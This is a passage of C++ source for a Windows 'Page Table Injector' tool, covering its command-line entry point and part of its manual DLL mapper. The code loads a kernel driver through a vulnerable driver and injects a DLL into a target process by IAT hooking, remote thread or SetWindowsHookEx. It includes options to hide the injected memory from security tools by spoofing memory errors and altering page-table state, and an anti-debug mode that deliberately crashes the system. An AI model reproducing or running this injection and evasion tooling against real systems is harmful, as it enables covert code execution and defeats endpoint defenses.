  const auto vuln_driver_handle = g_driver_mapper->get_device_handle();

  if (vuln_driver_handle)
    g_service_manager->unload_vulnerable_driver(vuln_driver_handle);

  return EXCEPTION_EXECUTE_HANDLER;
}

int main(int argc, char* argv[]) {
  // init CLI11 app
  CLI::App app{"Page Table Injector"};

  // define variables and defaults to store arguments
  std::string window_name;
  std::string dll_path = "memory";
  settings::driver_alloc_mode driver_alloc_mode =
      settings::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT;
  settings::memory_type driver_mem_type = settings::memory_type::NORMAL_PAGE;
  settings::hide_type driver_hide_type = settings::hide_type::NONE;
  std::uint32_t dll_mem_type = g_driver_manager->memory_type::NORMAL_PAGE;
  std::uint32_t dll_alloc_mode = g_driver_manager->alloc_mode::ALLOC_AT_LOW_ADDRESS;
  settings::hide_type dll_hide_type = settings::hide_type::NONE;
  settings::experimental_options selected_option = settings::experimental_options::NONE;
  std::string hook_module = "user32.dll";
  std::string hook_function = "GetMessageW";
  std::string target_module = "";
  std::string execution_method = "iat";

  // additional options for better UX
  bool verbose = false;
  bool dry_run = false;

  // required argument - target window
  app.add_option("target", window_name, "Target window name (e.g., \"Notepad\")")->required();

  // optional DLL path with validation
  app.add_option("-d,--dll", dll_path, "Path to DLL file or \"memory\" for embedded MessageBox DLL")
      ->check(CLI::ExistingFile.description("") | CLI::IsMember({"memory"}))
      ->capture_default_str();

  auto execution_map =
      std::map<std::string, std::string>{{"iat", "iat"}, {"thread", "thread"}, {"swhk", "swhk"}};

  app.add_option("-e,--execution", execution_method, "DLL execution method")
      ->transform(CLI::CheckedTransformer(execution_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("iat: Hook Import Address Table (default)\n"
                    "thread: Create remote thread for DLL entry point execution\n"
                    "swhk: Use SetWindowsHookEx for DLL entry point execution\n");

  // driver configuration group
  auto* driver_group = app.add_option_group("Driver Options", "Driver memory allocation settings");

  auto driver_alloc_map = std::map<std::string, settings::driver_alloc_mode>{
      {"system", settings::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT},
      {".data", settings::driver_alloc_mode::ALLOC_IN_NTOSKRNL_DATA_SECTION},
      {"current-process", settings::driver_alloc_mode::ALLOC_IN_CURRENT_PROCESS_CONTEXT}};

  auto driver_memory_type_map =
      std::map<std::string, settings::memory_type>{{"normal", settings::memory_type::NORMAL_PAGE},
                                                   {"large", settings::memory_type::LARGE_PAGE},
                                                   {"huge", settings::memory_type::HUGE_PAGE}};

  auto hide_type_map = std::map<std::string, settings::hide_type>{
      {"none", settings::hide_type::NONE},
      {"pfn_exists_bit", settings::hide_type::PFN_EXISTS_BIT},
      {"mi_remove_physical_memory", settings::hide_type::MI_REMOVE_PHYSICAL_MEMORY},
      {"set_parity_error", settings::hide_type::SET_PARITY_ERROR},
      {"set_lock_bit", settings::hide_type::SET_LOCK_BIT},
      {"hide_translation", settings::hide_type::HIDE_TRANSLATION}};

  auto experimental_options_map = std::map<std::string, settings::experimental_options>{
      {"none", settings::experimental_options::NONE},
      {"manipulate_system_partition", settings::experimental_options::MANIPULATE_SYSTEM_PARTITION}};

  driver_group->add_option("--driver-alloc", driver_alloc_mode, "Driver allocation strategy")
      ->transform(CLI::CheckedTransformer(driver_alloc_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("system: System context allocation\n"
                    ".data: Inside ntoskrnl .data section\n"
                    "current-process: Current process context (default)");

  driver_group->add_option("--driver-memory", driver_mem_type, "Driver memory page size")
      ->transform(CLI::CheckedTransformer(driver_memory_type_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("normal: 4KB pages (default)\n"
                    "large: 2MB pages\n"
                    "huge: 1GB pages (not supported yet)");

  driver_group->add_option("--driver-hide", driver_hide_type, "Driver memory hide type")
      ->transform(CLI::CheckedTransformer(hide_type_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("none: No memory hide\n"
                    "pfn_exists_bit: MmCopyMemory returns STATUS_INVALID_ADDRESS on "
                    "driver page\n"
                    "mi_remove_physical_memory: Page removed from physical memory "
                    "ranges\n"
                    "set_parity_error: MmCopyMemory returns STATUS_HARDWARE_MEMORY_ERROR "
                    "(default)\n"
                    "set_lock_bit: Anti-debug mechanism - causes system crash if page "
                    "copied\n"
                    "hide_translation: MmGetVirtualForPhysical returns 0 for the "
                    "physical address");

  // DLL configuration group
  auto* dll_group = app.add_option_group("DLL Options", "DLL memory allocation settings");

  auto dll_alloc_map = std::map<std::string, std::uint32_t>{
      {"inside-main", g_driver_manager->alloc_mode::ALLOC_INSIDE_MAIN_MODULE},
      {"between-modules", g_driver_manager->alloc_mode::ALLOC_BETWEEN_LEGIT_MODULES},
      {"low-address", g_driver_manager->alloc_mode::ALLOC_AT_LOW_ADDRESS},
      {"high-address", g_driver_manager->alloc_mode::ALLOC_AT_HIGH_ADDRESS},
      {"hyperspace", g_driver_manager->alloc_mode::ALLOC_AT_HYPERSPACE},
  };

  auto dll_memory_map =
      std::map<std::string, std::uint32_t>{{"normal", g_driver_manager->memory_type::NORMAL_PAGE},
                                           {"large", g_driver_manager->memory_type::LARGE_PAGE},
                                           {"huge", g_driver_manager->memory_type::HUGE_PAGE}};

  dll_group->add_option("--dll-alloc", dll_alloc_mode, "DLL allocation strategy")
      ->transform(CLI::CheckedTransformer(dll_alloc_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("inside-main: Hijack PTEs in main module\n"
                    "between-modules: Allocate between legitimate modules (default)\n"
                    "low-address: Usermode space (PML4 0-255)\n"
                    "high-address: Kernel space (PML4 256-511)\n"
                    "hyperspace: Hidden usermode address space (PML4 0-255)");

  dll_group->add_option("--dll-memory", dll_mem_type, "DLL memory page size")
      ->transform(CLI::CheckedTransformer(dll_memory_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("normal: 4KB pages (default)\n"
                    "large: 2MB pages\n"
                    "huge: 1GB pages (not supported yet)");

  dll_group->add_option("--dll-hide", dll_hide_type, "DLL memory hide type")
      ->transform(CLI::CheckedTransformer(hide_type_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("none: No memory hide\n"
                    "pfn_exists_bit: MmCopyMemory returns STATUS_INVALID_ADDRESS on DLL "
                    "page\n"
                    "mi_remove_physical_memory: Page removed from physical memory "
                    "ranges\n"
                    "set_parity_error: MmCopyMemory returns STATUS_HARDWARE_MEMORY_ERROR "
                    "(default)\n"
                    "set_lock_bit: Anti-debug mechanism - causes system crash if page "
                    "copied\n"
                    "hide_translation: MmGetVirtualForPhysical returns 0 for the "
                    "physical address");

  // hook configuration group
  auto* hook_group = app.add_option_group(
      "Hook Options", "IAT hooking configuration (only used with --execution iat)");

  hook_group->add_option("--hook-module", hook_module, "Module to hook in the IAT")
      ->capture_default_str();

  hook_group->add_option("--hook-function", hook_function, "Function to hook in the IAT")
      ->capture_default_str();

  hook_group->add_option("--target-module", target_module,
                         "Module whose IAT to hook (empty = main module)");

  auto* experimental_group =
      app.add_option_group("Experimental Options", "Extra functionality and tweaks");

  experimental_group
      ->add_option("--experimental", selected_option, "Experimental operations to perform")
      ->transform(CLI::CheckedTransformer(experimental_options_map, CLI::ignore_case))
      ->capture_default_str()
      ->description("none: No experimental operations (default)\n"
                    "manipulate_system_partition: modify MiSystemPartition to affect "
                    "MmGetPhysicalMemoryRanges");

  // utility options
  app.add_flag("-v,--verbose", verbose, "Enable detailed logging");
  app.add_flag("--dry-run", dry_run, "Show configuration without injecting");

  // enhanced help with examples
  app.get_formatter()->column_width(60);
  app.footer(R"(Examples:
  Basic Usage:
    pt-injector.exe Notepad                    # Inject embedded DLL with IAT hooking (default)
    pt-injector.exe Notepad -d payload.dll     # Inject custom DLL with IAT hooking
    pt-injector.exe Notepad -e thread          # Inject embedded DLL with thread execution

  Thread execution with hyperspace allocation:
    pt-injector.exe Notepad -e thread --dll-alloc hyperspace

  SetWindowsHook execution with hyperspace allocation:
    pt-injector.exe Notepad -d memory -e swhk --dll-alloc hyperspace

  Driver current process allocation and stealthy DLL allocation with IAT:
    pt-injector.exe Notepad -d memory -e iat --driver-alloc current-process --driver-memory large --dll-alloc between-modules --dll-memory normal --hook-module user32.dll --hook-function GetMessageW --target-module notepad.exe

  Thread execution with custom allocation:
    pt-injector.exe Notepad -d memory -e thread --driver-alloc current-process --dll-alloc low-address --dll-memory normal

  System-level allocation with IAT:
    pt-injector.exe Notepad -d memory -e iat --driver-alloc system --dll-alloc inside-main --dll-memory normal --hook-module user32.dll --hook-function GetMessageW --target-module notepad.exe

  Driver and DLL large page allocation with thread execution:
    pt-injector.exe Notepad -d memory -e thread --driver-alloc current-process --driver-memory large --dll-alloc low-address --dll-memory large

  Advanced stealth with custom hide options (IAT):
    pt-injector.exe Notepad -d memory -e iat --driver-hide set_parity_error --dll-hide set_parity_error --driver-memory large --dll-alloc between-modules

  Anti-debug configuration (WARNING: Will crash system if detected):
    pt-injector.exe Notepad -d memory --driver-hide set_lock_bit --dll-hide set_lock_bit

  Preview Mode:
    pt-injector.exe Notepad --dry-run -v      # Show configuration without injecting

Note: Use quotes around window names with spaces
      Thread execution method is recommended for hyperspace allocation)");

  // parse arguments
  try {
    app.parse(argc, argv);
  } catch (const CLI::ParseError& e) {
    return app.exit(e);
  }

  // warn about dangerous hide options
  if (driver_hide_type == settings::hide_type::SET_LOCK_BIT ||
      dll_hide_type == settings::hide_type::SET_LOCK_BIT) {
    debug_log("WARNING", "set_lock_bit is an anti-debug mechanism that will crash the system if "
                         "the page is copied by security tools");
  }

  // show configuration if verbose or dry-run
  if (verbose || dry_run) {
    std::cout << "\n=== PT-Injector Configuration ===\n";
    std::cout << "Target Window: " << window_name << "\n";
    std::cout << "DLL Source: " << dll_path << "\n";
    std::cout << "Execution Method: " << execution_method << "\n";

    // map back to readable names for display
    std::string driver_alloc_str, driver_mem_str, driver_hide_str;
    std::string dll_alloc_str, dll_mem_str, dll_hide_str;

    for (auto& [name, val] : driver_alloc_map)
      if (val == driver_alloc_mode) {
        driver_alloc_str = name;
        break;
      }
    for (auto& [name, val] : driver_memory_type_map)
      if (val == driver_mem_type) {
        driver_mem_str = name;
        break;
      }
    for (auto& [name, val] : hide_type_map)
      if (val == driver_hide_type) {
        driver_hide_str = name;
        break;
      }
    for (auto& [name, val] : dll_alloc_map)
      if (val == dll_alloc_mode) {
        dll_alloc_str = name;
        break;
      }
    for (auto& [name, val] : dll_memory_map)
      if (val == dll_mem_type) {
        dll_mem_str = name;
        break;
      }
    for (auto& [name, val] : hide_type_map)
      if (val == dll_hide_type) {
        dll_hide_str = name;
        break;
      }

    std::cout << "Driver: " << driver_alloc_str << " allocation, " << driver_mem_str << " pages, "
              << driver_hide_str << " hiding\n";
    std::cout << "DLL: " << dll_alloc_str << " allocation, " << dll_mem_str << " pages, "
              << dll_hide_str << " hiding\n";

    if (execution_method == "iat") {
      std::cout << "Hook: " << hook_function << " in " << hook_module;
      if (!target_module.empty())
        std::cout << " (target: " << target_module << ")";
      std::cout << "\n";
    } else {
      std::cout << "Thread: DLL entry point execution\n";
    }

    if (selected_option != settings::experimental_options::NONE) {
      std::string experimental_str;
      for (auto& [name, val] : experimental_options_map)
        if (val == selected_option) {
          experimental_str = name;
          break;
        }
      std::cout << "Experimental: " << experimental_str << "\n";
    }

    std::cout << std::string(40, '=') << "\n\n";

    if (dry_run) {
      std::cout << "[DRY RUN] Configuration validated - no injection performed\n";
      return 0;
    }
  }

  // convert window_name to wstring
  std::wstring w_window_name(window_name.begin(), window_name.end());

  // convert target_module to wstring
  std::wstring w_target_module(target_module.begin(), target_module.end());

  // initialize the driver
  SetUnhandledExceptionFilter(crash_handler);

  std::vector<std::uint8_t> driver_data(driver_shell, driver_shell + sizeof(driver_shell));
  NTSTATUS exit_code = 0xC0000001;
  auto status_map_driver =
      g_driver_mapper->map_driver(driver_data, 0, 0, false, true, false, &exit_code,
                                  static_cast<settings::driver_alloc_mode>(driver_alloc_mode),
                                  static_cast<settings::memory_type>(driver_mem_type),
                                  static_cast<settings::hide_type>(driver_hide_type),
                                  static_cast<settings::hide_type>(dll_hide_type),
                                  static_cast<settings::experimental_options>(selected_option));

  if (!status_map_driver || exit_code == 0xC0000001) {
    debug_log("ERROR", "failed to map driver");
    return 1;
  }

  if (!g_driver_manager->initialize()) {
    debug_log("ERROR", "driver failed to initialize");
    return 1;
  }

  debug_log("INFO", "waiting for window...");

  // find the window
  std::uint32_t tid;
  unsigned long pid;
  if (!g_window_manager->initialize_and_find_window(w_window_name.c_str(), pid, tid)) {
    debug_log("ERROR", "failed to find window");
    return 1;
  }

  debug_log("SUCCESS", "window found, preparing to inject...");

  // determine payload source
  void* dll_bytes = nullptr;
  size_t dll_size = 0;
  std::vector<uint8_t> file_bytes;

  if (dll_path == "memory") {
    // use in-memory DLL (MessageBox)
    dll_bytes = (void*)dll_shell;
    debug_log("INFO", "using in-memory DLL payload");
  } else {
    // load DLL from disk
    file_bytes = g_utils->read_file(dll_path);
    if (file_bytes.empty()) {
      debug_log("ERROR", "failed to read DLL file");
      return 1;
    }

    dll_bytes = file_bytes.data();
    dll_size = file_bytes.size();
    debug_log("INFO", "using DLL from disk: %s", dll_path.c_str());
  }

  // enhanced logging with readable names
  std::string driver_alloc_mode_str;
  if (driver_alloc_mode == settings::driver_alloc_mode::ALLOC_IN_SYSTEM_CONTEXT) {
    driver_alloc_mode_str = "ALLOC_IN_SYSTEM_CONTEXT";
  } else if (driver_alloc_mode == settings::driver_alloc_mode::ALLOC_IN_NTOSKRNL_DATA_SECTION) {
    driver_alloc_mode_str = "ALLOC_IN_NTOSKRNL_DATA_SECTION";
  } else if (driver_alloc_mode == settings::driver_alloc_mode::ALLOC_IN_CURRENT_PROCESS_CONTEXT) {
    driver_alloc_mode_str = "ALLOC_IN_CURRENT_PROCESS_CONTEXT";
  } else {
    driver_alloc_mode_str = "UNKNOWN";
  }

  std::string driver_mem_type_str;
  if (driver_mem_type == settings::memory_type::NORMAL_PAGE) {
    driver_mem_type_str = "NORMAL_PAGE";
  } else if (driver_mem_type == settings::memory_type::LARGE_PAGE) {
    driver_mem_type_str = "LARGE_PAGE";
  } else if (driver_mem_type == settings::memory_type::HUGE_PAGE) {
    driver_mem_type_str = "HUGE_PAGE";
  } else {
    driver_mem_type_str = "UNKNOWN";
  }

  std::string driver_hide_type_str;
  if (driver_hide_type == settings::hide_type::NONE) {
    driver_hide_type_str = "NONE";
  } else if (driver_hide_type == settings::hide_type::PFN_EXISTS_BIT) {
    driver_hide_type_str = "PFN_EXISTS_BIT";
  } else if (driver_hide_type == settings::hide_type::MI_REMOVE_PHYSICAL_MEMORY) {
    driver_hide_type_str = "MI_REMOVE_PHYSICAL_MEMORY";
  } else if (driver_hide_type == settings::hide_type::SET_PARITY_ERROR) {
    driver_hide_type_str = "SET_PARITY_ERROR";
  } else if (driver_hide_type == settings::hide_type::SET_LOCK_BIT) {
    driver_hide_type_str = "SET_LOCK_BIT";
  } else if (driver_hide_type == settings::hide_type::HIDE_TRANSLATION) {
    driver_hide_type_str = "HIDE_TRANSLATION";
  } else {
    driver_hide_type_str = "UNKNOWN";
  }

  std::string dll_alloc_mode_str;
  if (dll_alloc_mode == g_driver_manager->alloc_mode::ALLOC_INSIDE_MAIN_MODULE) {
    dll_alloc_mode_str = "ALLOC_INSIDE_MAIN_MODULE";
  } else if (dll_alloc_mode == g_driver_manager->alloc_mode::ALLOC_BETWEEN_LEGIT_MODULES) {
    dll_alloc_mode_str = "ALLOC_BETWEEN_LEGIT_MODULES";
  } else if (dll_alloc_mode == g_driver_manager->alloc_mode::ALLOC_AT_LOW_ADDRESS) {
    dll_alloc_mode_str = "ALLOC_AT_LOW_ADDRESS";
  } else if (dll_alloc_mode == g_driver_manager->alloc_mode::ALLOC_AT_HIGH_ADDRESS) {
    dll_alloc_mode_str = "ALLOC_AT_HIGH_ADDRESS";
  } else if (dll_alloc_mode == g_driver_manager->alloc_mode::ALLOC_AT_HYPERSPACE) {
    dll_alloc_mode_str = "ALLOC_AT_HYPERSPACE";
  } else {
    dll_alloc_mode_str = "UNKNOWN";
  }

  std::string dll_mem_type_str;
  if (dll_mem_type == g_driver_manager->memory_type::NORMAL_PAGE) {
    dll_mem_type_str = "NORMAL_PAGE";
  } else if (dll_mem_type == g_driver_manager->memory_type::LARGE_PAGE) {
    dll_mem_type_str = "LARGE_PAGE";
  } else if (dll_mem_type == g_driver_manager->memory_type::HUGE_PAGE) {
    dll_mem_type_str = "HUGE_PAGE";
  } else {
    dll_mem_type_str = "UNKNOWN";
  }

  std::string dll_hide_type_str;
  if (dll_hide_type == settings::hide_type::NONE) {
    dll_hide_type_str = "NONE";
  } else if (dll_hide_type == settings::hide_type::PFN_EXISTS_BIT) {
    dll_hide_type_str = "PFN_EXISTS_BIT";
  } else if (dll_hide_type == settings::hide_type::MI_REMOVE_PHYSICAL_MEMORY) {
    dll_hide_type_str = "MI_REMOVE_PHYSICAL_MEMORY";
  } else if (dll_hide_type == settings::hide_type::SET_PARITY_ERROR) {
    dll_hide_type_str = "SET_PARITY_ERROR";
  } else if (dll_hide_type == settings::hide_type::SET_LOCK_BIT) {
    dll_hide_type_str = "SET_LOCK_BIT";
  } else if (dll_hide_type == settings::hide_type::HIDE_TRANSLATION) {
    dll_hide_type_str = "HIDE_TRANSLATION";
  } else {
    dll_hide_type_str = "UNKNOWN";
  }

  if (verbose) {
    debug_log("INFO", "execution method: %s", execution_method.c_str());
    debug_log("INFO", "driver allocation mode: %s", driver_alloc_mode_str.c_str());
    debug_log("INFO", "driver memory type: %s", driver_mem_type_str.c_str());
    debug_log("INFO", "driver hide type: %s", driver_hide_type_str.c_str());
    debug_log("INFO", "dll allocation mode: %s", dll_alloc_mode_str.c_str());
    debug_log("INFO", "dll memory type: %s", dll_mem_type_str.c_str());
    debug_log("INFO", "dll hide type: %s", dll_hide_type_str.c_str());

    if (execution_method == "iat") {
      debug_log("INFO", "IAT Hook module: %s", hook_module.c_str());
      debug_log("INFO", "IAT Hook function: %s", hook_function.c_str());
      debug_log("INFO", "IAT Target module: %s",
                target_module.empty() ? "Main Module" : target_module.c_str());
    }
  }

  // set execution method and initialize the injector
  if (execution_method == "iat") {
    g_dll_mapper->set_iat_hook_params(hook_module.c_str(), hook_function.c_str(),
                                      w_target_module.c_str());
    g_dll_mapper->set_execution_method(dll_mapper_t::execution_method::IAT_HOOK);
  } else if (execution_method == "swhk") {
    g_dll_mapper->set_execution_method(dll_mapper_t::execution_method::SET_WINDOWS_HOOK);
  } else {
    g_dll_mapper->set_execution_method(dll_mapper_t::execution_method::THREAD);
  }

  debug_log("INFO", "press any key to inject");

  getchar();

  if (!g_dll_mapper->run(pid, tid, dll_bytes, dll_size,
                         static_cast<driver_manager_t::memory_type>(dll_mem_type),
                         static_cast<driver_manager_t::alloc_mode>(dll_alloc_mode))) {
    debug_log("ERROR", "failed to inject");
    return 1;
  }

  debug_log("SUCCESS", "injection completed successfully");

  if (!g_driver_manager->unload()) {
    debug_log("ERROR", "failed to unhook/unload driver");
  }

  return 0;
}
```

`client/inject/dll_mapper.cpp`:

```cpp
#include "dll_mapper.hpp"

#include "utils/logging.h"

void dll_mapper_t::set_iat_hook_params(const char* hook_mod, const char* hook_func,
                                       const wchar_t* main_module) {
  this->hook_module = hook_mod;
  this->hook_function = hook_func;
  this->target_module = main_module;
}

const char* dll_mapper_t::get_method_name(execution_method method) {
  switch (method) {
    case execution_method::IAT_HOOK:
      return "IAT_HOOK";
    case execution_method::SET_WINDOWS_HOOK:
      return "SET_WINDOWS_HOOK";
    case execution_method::THREAD:
      return "THREAD";
    default:
      return "UNKNOWN";
  }
}

void dll_mapper_t::set_execution_method(execution_method method) {
  this->exec_method = method;
  debug_log("SUCCESS", "execution method set to: %s", get_method_name(method));
}

dll_mapper_t::execution_method dll_mapper_t::get_execution_method() const {
  return this->exec_method;
}

auto dll_mapper_t::get_nt_headers(const std::uintptr_t image_base) const -> IMAGE_NT_HEADERS* {
  const auto dos_header = reinterpret_cast<IMAGE_DOS_HEADER*>(image_base);
  return reinterpret_cast<IMAGE_NT_HEADERS*>(image_base + dos_header->e_lfanew);
}

auto dll_mapper_t::rva_va(const std::uintptr_t rva, IMAGE_NT_HEADERS* nt_header,
                          void* local_image) const -> void* {
  const auto first_section = IMAGE_FIRST_SECTION(nt_header);

  for (auto section = first_section;
       section < first_section + nt_header->FileHeader.NumberOfSections; section++) {
    if (rva >= section->VirtualAddress &&
        rva < section->VirtualAddress + section->Misc.VirtualSize) {
      return static_cast<unsigned char*>(local_image) + section->PointerToRawData +
             (rva - section->VirtualAddress);
    }
  }

  return nullptr;
}

auto dll_mapper_t::relocate_image(void* remote_image, void* local_image,
                                  IMAGE_NT_HEADERS* nt_header) const -> bool {
  struct reloc_entry {
    std::uint32_t to_rva;
    std::uint32_t size;
    struct {
      std::uint16_t offset : 12;
      std::uint16_t type : 4;
    } item[1];
  };

  const auto delta_offset =
      reinterpret_cast<std::uintptr_t>(remote_image) - nt_header->OptionalHeader.ImageBase;

  if (!delta_offset) {
    return true;
  }

  if (!(nt_header->OptionalHeader.DllCharacteristics & IMAGE_DLLCHARACTERISTICS_DYNAMIC_BASE)) {
    return false;
  }

  auto relocation_entry = static_cast<reloc_entry*>(rva_va(
      nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].VirtualAddress,
      nt_header, local_image));
  const auto relocation_end =
      reinterpret_cast<std::uintptr_t>(relocation_entry) +
      nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC].Size;

  if (relocation_entry == nullptr) {
    return true;
  }

  while (reinterpret_cast<std::uintptr_t>(relocation_entry) < relocation_end &&
         relocation_entry->size) {
    auto records_count = (relocation_entry->size - 8) >> 1;

    for (auto i = 0ul; i < records_count; i++) {
      std::uint16_t fixed_type = (relocation_entry->item[i].type);
      std::uint16_t shift_delta = (relocation_entry->item[i].offset) % 4096;

      if (fixed_type == IMAGE_REL_BASED_ABSOLUTE) {
        continue;
      }

      if (fixed_type == IMAGE_REL_BASED_HIGHLOW || fixed_type == IMAGE_REL_BASED_DIR64) {
        auto fixed_va = reinterpret_cast<std::uintptr_t>(
            rva_va(relocation_entry->to_rva, nt_header, local_image));

        if (!fixed_va) {
          fixed_va = reinterpret_cast<std::uintptr_t>(local_image);
        }

        *reinterpret_cast<std::uintptr_t*>(fixed_va + shift_delta) += delta_offset;
      }
    }

    relocation_entry = reinterpret_cast<reloc_entry*>(reinterpret_cast<LPBYTE>(relocation_entry) +
                                                      relocation_entry->size);
  }

  return true;
}

auto dll_mapper_t::resolve_function_address(const char* module_name,
                                            const char* function_name) const -> std::uintptr_t {
  const auto handle = LoadLibraryExA(module_name, nullptr, DONT_RESOLVE_DLL_REFERENCES);
  const auto offset = reinterpret_cast<std::uintptr_t>(GetProcAddress(handle, function_name)) -
                      reinterpret_cast<std::uintptr_t>(handle);
  FreeLibrary(handle);
  return offset;
}

bool dll_mapper_t::map_sections(std::uint32_t pid, void* module_base, void* local_image,
                                IMAGE_NT_HEADERS* nt_header) const {
  auto section = IMAGE_FIRST_SECTION(nt_header);
  auto num_sections = nt_header->FileHeader.NumberOfSections;
  debug_log("INFO", "number of sections to map: %u", num_sections);

  // validate number of sections
  if (num_sections == 0 || num_sections > 96) {  // PE format max is 96 sections
    debug_log("ERROR", "invalid number of sections: %u", num_sections);
    return false;
  }

  // calculate total size needed
  std::size_t total_mapping_size = 0;
  for (std::uint16_t i = 0; i < num_sections; i++) {
    if (!section[i].SizeOfRawData) {
      debug_log("INFO", "skipping section %u (%.*s) - no raw data", i + 1, 8, section[i].Name);
      continue;
    }

    // Validate section data
    if (section[i].PointerToRawData > nt_header->OptionalHeader.SizeOfImage) {
      debug_log("ERROR", "section %u has invalid PointerToRawData: 0x%X", i,
                section[i].PointerToRawData);
      return false;
    }

    auto section_end = section[i].VirtualAddress + section[i].SizeOfRawData;
    total_mapping_size = (total_mapping_size > static_cast<std::size_t>(section_end))
                             ? total_mapping_size
                             : static_cast<std::size_t>(section_end);
  }

  if (!total_mapping_size) {
    debug_log("ERROR", "no valid sections to map");
    return false;
  }

  std::size_t buffer_size = total_mapping_size;
  std::vector<std::uint8_t> combined_buffer(buffer_size, 0);

  // copy all sections to buffer
  std::uint16_t mapped_sections = 0;
  for (std::uint16_t i = 0; i < num_sections; i++) {
    if (!section[i].SizeOfRawData) {
      continue;
    }

    debug_log("INFO", "preparing section %u (%.*s) - VA: 0x%X, Size: 0x%X", i + 1, 8,
              section[i].Name, section[i].VirtualAddress, section[i].SizeOfRawData);

    auto source = reinterpret_cast<std::uint8_t*>(local_image) + section[i].PointerToRawData;
    auto dest = combined_buffer.data() + section[i].VirtualAddress;
    std::memcpy(dest, source, section[i].SizeOfRawData);
    mapped_sections++;
  }

  debug_log("INFO", "prepared %u sections in buffer", mapped_sections);

  // write to remote process
  if (!g_driver_manager->write_virtual_memory(pid, reinterpret_cast<std::uintptr_t>(module_base),
                                              combined_buffer.data(), buffer_size)) {
    debug_log("ERROR", "failed to write sections to remote process at 0x%p", module_base);
    return false;
  }

  debug_log("SUCCESS", "successfully mapped %u sections", mapped_sections);
  return true;
}

auto dll_mapper_t::resolve_import(DWORD process_id, DWORD thread_id, void* local_image,
                                  IMAGE_NT_HEADERS* nt_header) const -> bool {
  auto import_description = static_cast<IMAGE_IMPORT_DESCRIPTOR*>(
      rva_va(nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress,
             nt_header, local_image));

  if (!nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].VirtualAddress ||
      !nt_header->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT].Size) {
    return true;
  }

  while (import_description->Name) {
    LPSTR module_name =
        static_cast<LPSTR>(rva_va(import_description->Name, nt_header, local_image));
    const auto base_image = reinterpret_cast<uintptr_t>(LoadLibraryA(module_name));
    if (!base_image) {
      return false;
    }

    auto import_header_data = static_cast<IMAGE_THUNK_DATA*>(
        rva_va(import_description->FirstThunk, nt_header, local_image));

    while (import_header_data->u1.AddressOfData) {
      if (import_header_data->u1.Ordinal & IMAGE_ORDINAL_FLAG) {
        import_header_data->u1.Function =
            base_image +
            resolve_function_address(
                module_name, reinterpret_cast<LPCSTR>(import_header_data->u1.Ordinal & 0xFFFF));
      } else {
        auto ibn = static_cast<IMAGE_IMPORT_BY_NAME*>(
            rva_va(import_header_data->u1.AddressOfData, nt_header, local_image));
        import_header_data->u1.Function =
            base_image + resolve_function_address(module_name, reinterpret_cast<LPCSTR>(ibn->Name));
      }
      import_header_data++;
    }
    import_description++;
  }

  return true;
}

uintptr_t dll_mapper_t::find_iat_entry(uint32_t pid, uintptr_t module_base, const char* dll_name,
                                       const char* function_name) {
  // read DOS header
  IMAGE_DOS_HEADER dos_header = {0};
  g_driver_manager->read_virtual_memory(pid, module_base, &dos_header, sizeof(dos_header));

  if (dos_header.e_magic != IMAGE_DOS_SIGNATURE) {
    return 0;
  }

  // read NT headers
  IMAGE_NT_HEADERS nt_headers = {0};
  g_driver_manager->read_virtual_memory(pid, module_base + dos_header.e_lfanew, &nt_headers,
                                        sizeof(nt_headers));

  if (nt_headers.Signature != IMAGE_NT_SIGNATURE) {
    return 0;
  }

  // get import directory
  IMAGE_DATA_DIRECTORY import_directory =
      nt_headers.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_IMPORT];

  if (import_directory.VirtualAddress == 0 || import_directory.Size == 0) {
    return 0;
  }

  // calc max number of import descriptors (to prevent infinite loops)
  const size_t max_descriptors = import_directory.Size / sizeof(IMAGE_IMPORT_DESCRIPTOR);

  // process import descriptors using a fixed loop
  uintptr_t import_descriptor_addr = module_base + import_directory.VirtualAddress;

  for (size_t i = 0; i < max_descriptors; i++) {
    IMAGE_IMPORT_DESCRIPTOR import_descriptor = {0};
    g_driver_manager->read_virtual_memory(pid, import_descriptor_addr, &import_descriptor,
                                          sizeof(import_descriptor));

    // check for end of descriptors
    if (import_descriptor.Name == 0) {
      break;
    }

    // read DLL name
    char current_dll_name[256] = {0};
    g_driver_manager->read_virtual_memory(pid, module_base + import_descriptor.Name,
                                          current_dll_name, sizeof(current_dll_name));

    // check if this is the DLL we're looking for
    if (_stricmp(current_dll_name, dll_name) == 0) {
      // setup thunk addresses
      uintptr_t thunk_addr = module_base + import_descriptor.FirstThunk;
      uintptr_t original_thunk_addr = import_descriptor.OriginalFirstThunk
                                          ? module_base + import_descriptor.OriginalFirstThunk
                                          : thunk_addr;

      // process thunks with fixed max to prevent infinite loops
      const size_t max_thunks = 1000;  // arbitrary limit

      for (size_t j = 0; j < max_thunks; j++) {
        // read thunks
        IMAGE_THUNK_DATA thunk = {0}, original_thunk = {0};
        g_driver_manager->read_virtual_memory(pid, thunk_addr, &thunk, sizeof(thunk));

        if (original_thunk_addr != thunk_addr) {
          g_driver_manager->read_virtual_memory(pid, original_thunk_addr, &original_thunk,
                                                sizeof(original_thunk));
        } else {
          original_thunk = thunk;
        }

        // check for end of thunks
        if (thunk.u1.Function == 0) {
          break;
        }

        // check if imported by name (not by ordinal)
        if (!(original_thunk.u1.Ordinal & IMAGE_ORDINAL_FLAG)) {
          // read function name
          char current_function_name[256] = {0};
          uintptr_t name_addr = module_base + original_thunk.u1.AddressOfData + sizeof(WORD);
          g_driver_manager->read_virtual_memory(pid, name_addr, current_function_name,
                                                sizeof(current_function_name));

          // check if this is the function we're looking for
          if (strcmp(current_function_name, function_name) == 0) {
            return thunk_addr;
          }
        } else {
          // imported by ordinal
          WORD ordinal = IMAGE_ORDINAL(original_thunk.u1.Ordinal);
        }

        // move to next thunk
